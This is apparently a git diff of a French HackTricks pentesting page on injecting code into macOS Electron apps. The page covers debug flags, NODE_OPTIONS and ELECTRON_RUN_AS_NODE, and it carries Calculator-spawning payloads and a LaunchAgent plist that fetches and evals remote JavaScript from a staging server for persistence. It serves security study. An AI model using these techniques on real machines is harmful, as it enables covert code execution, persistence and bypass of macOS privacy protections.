@@ -1,13 +1,27 @@
-## Injection de code dans les applications Electron macOS
+# Injection dans les applications Electron macOS
 
-Le code JS d'une application Electron n'est pas signé, donc un attaquant pourrait déplacer l'application vers un emplacement inscriptible, injecter du code JS malveillant et lancer cette application pour abuser des autorisations TCC.
+<details>
+
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
+* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+
+</details>
+
+## Ajout de code aux applications Electron
+
+Le code JS d'une application Electron n'est pas signé, donc un attaquant pourrait déplacer l'application vers un emplacement inscriptible, injecter un code JS malveillant et lancer cette application pour abuser des autorisations TCC.
 
 Cependant, l'autorisation **`kTCCServiceSystemPolicyAppBundles`** est **nécessaire** pour modifier une application, donc par défaut cela n'est plus possible.
 
 ## Inspection d'une application Electron
 
-Selon [**ceci**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), si vous exécutez une application Electron avec des indicateurs tels que **`--inspect`**, **`--inspect-brk`** et **`--remote-debugging-port`**, un **port de débogage sera ouvert** pour que vous puissiez vous y connecter (par exemple depuis Chrome dans `chrome://inspect`) et vous pourrez **injecter du code** ou même lancer de nouveaux processus.\
-Par exemple:
+Selon [**ce lien**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), si vous exécutez une application Electron avec des indicateurs tels que **`--inspect`**, **`--inspect-brk`** et **`--remote-debugging-port`**, un **port de débogage sera ouvert** afin que vous puissiez vous y connecter (par exemple depuis Chrome dans `chrome://inspect`) et vous pourrez **injecter du code** ou même lancer de nouveaux processus.\
+Par exemple :
 
 {% code overflow="wrap" %}
 ```bash
@@ -18,18 +32,33 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-Notez que maintenant les applications Electron **renforcées** avec **RunAsNode** désactivé **ignoreront les paramètres de node** (tels que --inspect) lorsqu'elles seront lancées à moins que la variable d'environnement **`ELECTRON_RUN_AS_NODE`** ne soit définie.
+Notez que maintenant les applications Electron **renforcées** avec **RunAsNode** et **`EnableNodeCliInspectArguments`** sont désactivées et **ignoreront les paramètres node** (comme --inspect) lorsqu'elles sont lancées à moins que la variable d'environnement **`ELECTRON_RUN_AS_NODE`** ne soit définie.
 
 Cependant, vous pouvez toujours utiliser le paramètre electron `--remote-debugging-port=9229`, mais la charge utile précédente ne fonctionnera pas pour exécuter d'autres processus.
+
+Vous pouvez vérifier ces indicateurs à partir d'une application avec:
+```bash
+npx @electron/fuses read --app /Applications/Slack.app
+
+Analyzing app: Slack.app
+Fuse Version: v1
+RunAsNode is Disabled
+EnableCookieEncryption is Enabled
+EnableNodeOptionsEnvironmentVariable is Disabled
+EnableNodeCliInspectArguments is Disabled
+EnableEmbeddedAsarIntegrityValidation is Enabled
+OnlyLoadAppFromAsar is Enabled
+LoadBrowserProcessSpecificV8Snapshot is Disabled
+```
 {% endhint %}
 
 ## `NODE_OPTIONS`
 
 {% hint style="warning" %}
-Cette variable d'environnement ne fonctionnerait que si l'application Electron n'a pas été correctement renforcée et qu'elle l'autorise. Si elle est renforcée, vous devrez également utiliser la **variable d'environnement `ELECTRON_RUN_AS_NODE`**.
+Cette variable d'environnement ne fonctionnera que si l'application Electron n'a pas été correctement sécurisée et le permet. Si elle est sécurisée, vous devrez également utiliser la **variable d'environnement `ELECTRON_RUN_AS_NODE`**.
 {% endhint %}
 
-Avec cette combinaison, vous pouvez stocker la charge utile dans un fichier différent et exécuter ce fichier:
+Avec cette combinaison, vous pouvez stocker la charge utile dans un fichier différent et exécuter ce fichier :
 
 {% code overflow="wrap" %}
 ```bash
@@ -52,27 +81,27 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 ```
 {% endcode %}
 
-Comme [**proposé ici**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), vous pourriez abuser de cette variable d'environnement dans un plist pour maintenir la persistance :
+Comme [**proposé ici**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), vous pourriez exploiter cette variable d'environnement dans un plist pour maintenir la persistance :
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>EnvironmentVariables</key>
-    <dict>
-           <key>ELECTRON_RUN_AS_NODE</key>
-           <string>true</string>
-    </dict>
-    <key>Label</key>
-    <string>com.xpnsec.hideme</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
-        <string>-e</string>
-        <string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
+<key>EnvironmentVariables</key>
+<dict>
+<key>ELECTRON_RUN_AS_NODE</key>
+<string>true</string>
+</dict>
+<key>Label</key>
+<string>com.xpnsec.hideme</string>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
+<string>-e</string>
+<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
+</array>
+<key>RunAtLoad</key>
+<true/>
 </dict>
 </plist>
 ```
@@ -80,10 +109,10 @@ Comme [**proposé ici**](https://www.trustedsec.com/blog/macos-injection-via-thi
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live).
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
